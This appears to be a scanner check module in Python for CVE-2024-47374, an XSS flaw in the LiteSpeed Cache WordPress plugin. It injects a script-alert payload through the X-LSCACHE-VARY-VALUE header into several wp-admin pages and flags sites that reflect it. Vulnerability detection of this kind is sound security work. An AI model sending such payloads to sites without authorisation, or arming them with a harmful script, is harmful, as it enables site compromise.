#!/usr/bin/env python3

"""
https://blog.ostorlab.co/litespeed-cache,cve-2024-47374.html
"""

from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys

logger = configure_logger(__name__)


PAGES = [
    "wp-admin/admin.php?page=lscache-ccss",
    "wp-admin/admin.php?page=lscache",
    "wp-admin/admin.php?page=lscache-purge",
    "wp-admin/admin.php?page=lscache-settings",
    "wp-admin/admin.php?page=lscache-advanced",
]


def litespeed(base_url: str) -> None:
    headers = {"X-LSCACHE-VARY-VALUE": '"><script>alert("CVE-2024-47374")</script>'}

    for page in PAGES:
        target_url = f"{base_url}{page}"
        try:
            response = requests.get(
                target_url, headers=headers, verify=False, timeout=10
            )
            if "CVE-2024-47374" in response.text:
                print(
                    f" {Identify.confirmed} | CVE-2024-47374| {Colors.BLUE}{target_url}{Colors.RESET} | PAYLOAD: {headers}"
                )
        except requests.Timeout as t:
            logger.error(f"request timeout {base_url}", t)
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            logger.exception(f"request error {base_url}", e)
